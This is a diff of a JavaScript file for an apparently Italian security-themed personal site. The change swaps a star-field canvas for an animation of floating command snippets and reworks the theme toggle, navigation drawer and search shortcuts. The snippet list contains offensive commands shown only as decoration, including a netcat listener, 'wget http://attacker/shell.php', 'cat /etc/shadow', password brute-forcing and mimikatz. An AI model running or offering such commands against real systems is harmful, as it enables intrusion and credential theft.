@@ -1,196 +1,263 @@
-/* ═══════════════════════════════════════════════════════════
-   PASTA-COD3 — static-pages.js
-   Shared logic for about.html and contatti.html
-   ═══════════════════════════════════════════════════════════ */
+/* =========================================================
+   static-pages.js  —  pasta-cod3.github.io
+   Usato da: about.html, contatti.html (pagine statiche)
+   Funzioni: canvas animato, tema, hamburger menu
+   ========================================================= */
 
-/* ── Theme restore ───────────────────────────────────────── */
-(function(){
-  const saved = localStorage.getItem('theme');
-  if(saved){
-    document.documentElement.setAttribute('data-theme', saved);
-    const btn = document.getElementById('themeToggle');
-    if(btn) btn.textContent = saved === 'dark' ? '◐ LIGHT' : '◑ DARK';
-  }
-})();
+'use strict';
 
-document.getElementById('themeToggle').addEventListener('click', () => {
-  const html   = document.documentElement;
-  const isDark = html.getAttribute('data-theme') === 'dark';
-  const next   = isDark ? 'light' : 'dark';
-  html.setAttribute('data-theme', next);
-  localStorage.setItem('theme', next);
-  document.getElementById('themeToggle').textContent = isDark ? '◑ DARK' : '◐ LIGHT';
-});
+/* ─── CANVAS: frammenti di codice fluttuanti ─────────────── */
 
-/* ── Mobile hamburger ────────────────────────────────────── */
-(function(){
-  const hamburger = document.getElementById('hamburger');
-  const drawer    = document.getElementById('navDrawer');
-  const overlay   = document.getElementById('navOverlay');
-  if(!hamburger || !drawer || !overlay) return;
+const CODE_FRAGMENTS = [
+  'nmap -sV -sC -p-',       'dirb http://target/',
+  'sqlmap -u "url" --dbs',  'hydra -l admin -P rockyou.txt',
+  'gobuster dir -u url',    'msfconsole -q',
+  'nc -lvnp 4444',          'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
+  'cat /etc/shadow',        'sudo -l',
+  'find / -perm -4000',     'linpeas.sh',
+  'chisel server -p 8080',  'proxychains nmap',
+  'john --wordlist=rockyou','hashcat -m 0 hash.txt',
+  'curl -s http://target',  'wget http://attacker/shell.php',
+  'ssh -L 1080:127.0.0.1', 'ssh -D 1080 user@host',
+  'tcpdump -i eth0',        'wireshark &',
+  'burpsuite &',            './exploit.py',
+  'whoami && id',           'uname -a',
+  'ps aux | grep root',     'netstat -tulnp',
+  'ip route show',          'arp -a',
+  'enum4linux -a target',   'rpcclient -U "" target',
+  'smbclient -L target',    'crackmapexec smb target',
+  'evil-winrm -i target',   'impacket-psexec',
+  'mimikatz # sekurlsa',    'bloodhound-python -d',
+  'certutil -decode',       'msfvenom -p windows',
+  'base64 -d shell.b64',    'xxd -r -p hex.txt',
+  'strings binary | grep',  'ltrace ./vuln',
+  'gdb -q ./binary',        'pwndbg> cyclic 200',
+  'checksec --file=elf',    'ROPgadget --binary elf'
+];
 
-  function open(){
-    drawer.classList.add('open');
-    drawer.style.display = 'flex';
-    overlay.classList.add('open');
-    hamburger.classList.add('open');
-    document.body.style.overflow = 'hidden';
-  }
-  function close(){
-    drawer.classList.remove('open');
-    overlay.classList.remove('open');
-    hamburger.classList.remove('open');
-    document.body.style.overflow = '';
-    setTimeout(() => { if(!drawer.classList.contains('open')) drawer.style.display='none'; }, 350);
+class CodeFrag {
+  constructor(canvas) {
+    this.canvas = canvas;
+    this.reset(true);
   }
 
-  hamburger.addEventListener('click', () => drawer.classList.contains('open') ? close() : open());
-  overlay.addEventListener('click', close);
-  drawer.querySelectorAll('.nav-drawer-link').forEach(l => l.addEventListener('click', close));
-})();
+  reset(init = false) {
+    const c = this.canvas;
+    this.text    = CODE_FRAGMENTS[Math.floor(Math.random() * CODE_FRAGMENTS.length)];
+    this.x       = Math.random() * c.width;
+    this.y       = Math.random() * c.height;
+    this.fontSize= 9 + Math.random() * 3.5;
+    this.bright  = Math.random() < 0.18;
+    this.maxAlpha= this.bright ? 0.35 : 0.14;
+    this.color   = this.bright ? '#00c8ff' : '#004466';
+    this.state   = init
+      ? (['typing','hold','fade'])[Math.floor(Math.random() * 3)]
+      : 'typing';
+    this.charIdx = this.state === 'typing'
+      ? Math.floor(Math.random() * this.text.length)
+      : (this.state === 'hold' ? this.text.length : this.text.length);
+    this.alpha   = this.state === 'typing' ? 0
+      : (this.state === 'hold' ? this.maxAlpha : this.maxAlpha * Math.random());
+    this.holdTick= 0;
+    this.holdMax = 40 + Math.random() * 80;
+    const isMob  = window.innerWidth < 768;
+    this.typeRate= isMob ? 3 : 2 + Math.floor(Math.random() * 4);
+    this.tick    = 0;
+  }
 
-/* ── Space constellation (same as main.js) ───────────────── */
-(function initConstellation(){
+  update() {
+    this.tick++;
+    if (this.state === 'typing') {
+      this.alpha = Math.min(this.maxAlpha, this.alpha + 0.015);
+      if (this.tick % this.typeRate === 0) {
+        this.charIdx++;
+        if (this.charIdx >= this.text.length) this.state = 'hold';
+      }
+    } else if (this.state === 'hold') {
+      this.holdTick++;
+      if (this.holdTick >= this.holdMax) this.state = 'fade';
+    } else {
+      this.alpha -= 0.012;
+      if (this.alpha <= 0) this.reset();
+    }
+  }
+
+  draw(ctx) {
+    if (this.alpha <= 0) return;
+    ctx.save();
+    ctx.font         = `${this.fontSize}px 'JetBrains Mono', monospace`;
+    ctx.fillStyle    = this.color;
+    ctx.globalAlpha  = this.alpha;
+    ctx.letterSpacing= '0.04em';
+    const visible = this.text.slice(0, this.charIdx);
+    const cursor  = this.state === 'typing'
+      ? (Math.floor(Date.now() / 530) % 2 === 0 ? '▋' : '') : '';
+    ctx.fillText(visible + cursor, this.x, this.y);
+    ctx.restore();
+  }
+}
+
+function initCanvas() {
   const canvas = document.getElementById('spaceCanvas');
-  if(!canvas) return;
+  if (!canvas) return;
+
+  const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
+  if (mq.matches) { canvas.style.display = 'none'; return; }
+
   const ctx = canvas.getContext('2d');
-  const mouse = { x:-9999, y:-9999 };
-  const MOUSE_R = 140;
+  let frags = [], raf;
 
-  window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
-  window.addEventListener('mouseleave', () => { mouse.x=-9999; mouse.y=-9999; });
-
-  function resize(){
+  function resize() {
     canvas.width  = window.innerWidth;
     canvas.height = window.innerHeight;
   }
+
+  function spawn() {
+    const isMob = window.innerWidth < 768;
+    const count = isMob ? 6 : 16;
+    frags = Array.from({ length: count }, () => new CodeFrag(canvas));
+  }
+
+  function loop() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    frags.forEach(f => { f.update(); f.draw(ctx); });
+    raf = requestAnimationFrame(loop);
+  }
+
+  let resizeTimer;
+  window.addEventListener('resize', () => {
+    clearTimeout(resizeTimer);
+    resizeTimer = setTimeout(() => {
+      cancelAnimationFrame(raf);
+      resize();
+      spawn();
+      loop();
+    }, 200);
+  });
+
   resize();
-  window.addEventListener('resize', resize);
-
-  function palette(){
-    const dark = document.documentElement.getAttribute('data-theme') === 'dark';
-    return dark ? [
-      {r:0,g:255,b:180}, {r:0,g:170,b:255}, {r:255,g:51,b:102},
-      {r:200,g:100,b:255}, {r:240,g:165,b:0}, {r:180,g:220,b:255}
-    ] : [
-      {r:56,g:189,b:248}, {r:129,g:140,b:248}, {r:251,g:113,b:133},
-      {r:167,g:139,b:250}, {r:251,g:191,b:36}, {r:200,g:230,b:255}
-    ];
-  }
-  function randColor(p){ return p[Math.floor(Math.random()*p.length)]; }
-  function rgba(c,a){ return `rgba(${c.r},${c.g},${c.b},${a})`; }
-
-  const TYPES = {STAR:0,MOON:1,GALAXY:2,NODE:3};
-  let pal = palette();
-
-  function makeNode(){
-    const roll = Math.random();
-    const type = roll<.06?TYPES.GALAXY : roll<.14?TYPES.MOON : roll<.45?TYPES.STAR : TYPES.NODE;
-    return {
-      x:Math.random()*window.innerWidth, y:Math.random()*window.innerHeight,
-      vx:(Math.random()-.5)*.3, vy:(Math.random()-.5)*.3,
-      r: type===TYPES.GALAXY?18+Math.random()*14 : type===TYPES.MOON?4+Math.random()*4 : type===TYPES.STAR?1+Math.random()*1.5 : 1.5+Math.random()*1.5,
-      color:randColor(pal), type, phase:Math.random()*Math.PI*2, speed:.5+Math.random()*.8,
-      arms:type===TYPES.GALAXY?2+Math.floor(Math.random()*3):0,
-      armLen:type===TYPES.GALAXY?30+Math.random()*20:0, twinkle:Math.random()<.4
-    };
-  }
-
-  const NUM = 130;
-  let nodes = Array.from({length:NUM}, makeNode);
-  let frame = 0;
-
-  function drawStar(n,alpha,glow){
-    const s=n.r*(1+glow*.4);
-    ctx.save(); ctx.translate(n.x,n.y);
-    ctx.shadowBlur=glow?12+glow*10:4; ctx.shadowColor=rgba(n.color,.8);
-    ctx.fillStyle=rgba(n.color,alpha);
-    ctx.beginPath();
-    ctx.moveTo(0,-s*2.2); ctx.lineTo(s*.35,-s*.35); ctx.lineTo(s*2.2,0); ctx.lineTo(s*.35,s*.35);
-    ctx.lineTo(0,s*2.2); ctx.lineTo(-s*.35,s*.35); ctx.lineTo(-s*2.2,0); ctx.lineTo(-s*.35,-s*.35);
-    ctx.closePath(); ctx.fill();
-    ctx.beginPath(); ctx.arc(0,0,s*.6,0,Math.PI*2); ctx.fill();
-    ctx.restore();
-  }
-
-  function drawMoon(n,alpha,glow){
-    ctx.save(); ctx.translate(n.x,n.y); ctx.rotate(n.phase*.2);
-    ctx.shadowBlur=glow?15+glow*12:6; ctx.shadowColor=rgba(n.color,.7);
-    ctx.beginPath(); ctx.arc(0,0,n.r,0,Math.PI*2);
-    ctx.fillStyle=rgba(n.color,alpha*.9); ctx.fill();
-    const bgColor=document.documentElement.getAttribute('data-theme')==='dark'?'rgba(2,4,8,1)':'rgba(10,14,23,1)';
-    ctx.beginPath(); ctx.arc(n.r*.45,0,n.r*.85,0,Math.PI*2);
-    ctx.fillStyle=bgColor; ctx.fill(); ctx.restore();
-  }
-
-  function drawGalaxy(n,alpha,glow){
-    ctx.save(); ctx.translate(n.x,n.y); ctx.rotate(frame*.002*n.speed);
-    ctx.shadowBlur=glow?20+glow*15:10; ctx.shadowColor=rgba(n.color,.5);
-    for(let arm=0;arm<n.arms;arm++){
-      const aa=(Math.PI*2/n.arms)*arm;
-      for(let p=0;p<28;p++){
-        const t=p/27, angle=aa+t*Math.PI*2.2, dist=t*n.armLen;
-        ctx.beginPath(); ctx.arc(Math.cos(angle)*dist,Math.sin(angle)*dist*.5,(1-t)*1.8+.3,0,Math.PI*2);
-        ctx.fillStyle=rgba(n.color,(1-t)*alpha*.7); ctx.fill();
-      }
-    }
-    const grad=ctx.createRadialGradient(0,0,0,0,0,n.r*.6);
-    grad.addColorStop(0,rgba(n.color,alpha*.9)); grad.addColorStop(.5,rgba(n.color,alpha*.4)); grad.addColorStop(1,rgba(n.color,0));
-    ctx.beginPath(); ctx.arc(0,0,n.r*.6,0,Math.PI*2); ctx.fillStyle=grad; ctx.fill(); ctx.restore();
-  }
-
-  function drawNode(n,alpha,glow){
-    ctx.beginPath(); ctx.shadowBlur=glow?8+glow*8:0; ctx.shadowColor=rgba(n.color,.8);
-    ctx.fillStyle=rgba(n.color,alpha); ctx.arc(n.x,n.y,n.r+(glow*.5),0,Math.PI*2); ctx.fill();
-  }
-
-  function draw(){
-    ctx.clearRect(0,0,canvas.width,canvas.height); ctx.shadowBlur=0;
-    for(let i=0;i<nodes.length;i++){
-      const a=nodes[i]; if(a.type===TYPES.GALAXY) continue;
-      for(let j=i+1;j<nodes.length;j++){
-        const b=nodes[j]; if(b.type===TYPES.GALAXY) continue;
-        const dx=a.x-b.x, dy=a.y-b.y, dist=Math.sqrt(dx*dx+dy*dy);
-        if(dist<150){
-          const mx=(a.x+b.x)/2-mouse.x, my=(a.y+b.y)/2-mouse.y;
-          const md=Math.sqrt(mx*mx+my*my);
-          const boost=md<MOUSE_R?(1-md/MOUSE_R)*.5:0;
-          ctx.beginPath(); ctx.strokeStyle=rgba(a.color,(1-dist/150)*.25+boost*.3);
-          ctx.lineWidth=.5+(boost*1.2); ctx.shadowBlur=boost>0?boost*8:0; ctx.shadowColor=rgba(a.color,.4);
-          ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.stroke();
-        }
-      }
-    }
-    ctx.shadowBlur=0;
-    nodes.forEach(n=>{
-      const dx=n.x-mouse.x, dy=n.y-mouse.y, md=Math.sqrt(dx*dx+dy*dy);
-      const near=md<MOUSE_R, glow=near?(1-md/MOUSE_R):0;
-      const ta=n.twinkle?.4+Math.sin(frame*.05*n.speed+n.phase)*.35:.65;
-      const alpha=near?Math.min(ta+glow*.4,1):ta;
-      switch(n.type){
-        case TYPES.STAR:   drawStar(n,alpha,glow);   break;
-        case TYPES.MOON:   drawMoon(n,alpha,glow);   break;
-        case TYPES.GALAXY: drawGalaxy(n,alpha,glow); break;
-        default:           drawNode(n,alpha,glow);
-      }
-    });
-    ctx.shadowBlur=0;
-  }
-
-  function update(){
-    frame++; pal=palette();
-    nodes.forEach(n=>{
-      const dx=n.x-mouse.x, dy=n.y-mouse.y, dist=Math.sqrt(dx*dx+dy*dy);
-      if(dist<MOUSE_R&&dist>0){ const f=.015*(1-dist/MOUSE_R); n.vx+=(dx/dist)*f*3; n.vy+=(dy/dist)*f*3; }
-      n.vx*=.98; n.vy*=.98;
-      const sp=Math.sqrt(n.vx*n.vx+n.vy*n.vy);
-      if(sp>1.5){ n.vx=n.vx/sp*1.5; n.vy=n.vy/sp*1.5; }
-      n.x+=n.vx; n.y+=n.vy; n.phase+=.005*n.speed;
-      if(n.x<-30) n.x=canvas.width+30; if(n.x>canvas.width+30) n.x=-30;
-      if(n.y<-30) n.y=canvas.height+30; if(n.y>canvas.height+30) n.y=-30;
-    });
-  }
-
-  function loop(){ update(); draw(); requestAnimationFrame(loop); }
+  spawn();
   loop();
-})();
+}
+
+/* ─── TEMA chiaro / scuro ────────────────────────────────── */
+
+function initTheme() {
+  const btn = document.getElementById('themeToggle');
+  if (!btn) return;
+
+  const saved = localStorage.getItem('theme');
+  if (saved === 'light') document.documentElement.classList.add('light');
+
+  function updateBtn() {
+    const isLight = document.documentElement.classList.contains('light');
+    btn.textContent = isLight ? '◑ DARK' : '◐ LIGHT';
+    btn.setAttribute('aria-label', isLight ? 'Passa al tema scuro' : 'Passa al tema chiaro');
+  }
+
+  updateBtn();
+
+  btn.addEventListener('click', () => {
+    document.documentElement.classList.toggle('light');
+    const isLight = document.documentElement.classList.contains('light');
+    localStorage.setItem('theme', isLight ? 'light' : 'dark');
+    updateBtn();
+  });
+}
+
+/* ─── HAMBURGER / NAV DRAWER ─────────────────────────────── */
+
+function initNav() {
+  const hamburger = document.getElementById('hamburger');
+  const overlay   = document.getElementById('navOverlay');
+  const drawer    = document.getElementById('navDrawer');
+  if (!hamburger || !overlay || !drawer) return;
+
+  function openDrawer() {
+    drawer.classList.add('open');
+    overlay.classList.add('visible');
+    document.body.style.overflow = 'hidden';
+    hamburger.setAttribute('aria-expanded', 'true');
+  }
+
+  function closeDrawer() {
+    drawer.classList.remove('open');
+    overlay.classList.remove('visible');
+    document.body.style.overflow = '';
+    hamburger.setAttribute('aria-expanded', 'false');
+  }
+
+  hamburger.addEventListener('click', () => {
+    drawer.classList.contains('open') ? closeDrawer() : openDrawer();
+  });
+
+  overlay.addEventListener('click', closeDrawer);
+
+  // Chiudi con ESC
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeDrawer();
+  });
+
+  // Link nel drawer che portano a categoria su index.html
+  drawer.querySelectorAll('[data-cat]').forEach(link => {
+    link.addEventListener('click', e => {
+      const cat = link.dataset.cat;
+      if (cat) {
+        e.preventDefault();
+        sessionStorage.setItem('filterCat', cat);
+        window.location.href = link.getAttribute('href') || 'index.html';
+      }
+    });
+  });
+}
+
+/* ─── SEARCH TOGGLE (mobile) ─────────────────────────────── */
+
+function initSearchToggle() {
+  const btn = document.getElementById('searchToggleBtn');
+  const bar = document.getElementById('searchMobileBar');
+  const inp = document.getElementById('searchInputMobile');
+  if (!btn || !bar) return;
+
+  btn.addEventListener('click', () => {
+    const open = bar.classList.toggle('open');
+    if (open && inp) inp.focus();
+  });
+}
+
+/* ─── KEYBOARD SHORTCUT ⌘K / Ctrl+K ─────────────────────── */
+
+function initSearchShortcut() {
+  document.addEventListener('keydown', e => {
+    if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
+      e.preventDefault();
+      // Su pagine statiche porta a index con focus search
+      sessionStorage.setItem('focusSearch', '1');
+      window.location.href = 'index.html';
+    }
+  });
+}
+
+/* ─── TERMINAL ANIMATION (about.html) ───────────────────── */
+/* L'animazione principale è inline in about.html per garantire
+   l'ordine di esecuzione. Questo blocco aggiunge solo eventuale
+   logica extra se #terminalBox esiste. */
+
+function initTerminalExtras() {
+  const box = document.getElementById('terminalBox');
+  if (!box) return;
+  // Cursore lampeggiante permanente sull'ultima linea
+  // (già gestito dal CSS con @keyframes blink sull'elemento .cursor)
+}
+
+/* ─── INIT ───────────────────────────────────────────────── */
+
+document.addEventListener('DOMContentLoaded', () => {
+  // Flash-prevention già eseguito inline nell'<head>
+  initCanvas();
+  initTheme();
+  initNav();
+  initSearchToggle();
+  initSearchShortcut();
+  initTerminalExtras();
+});
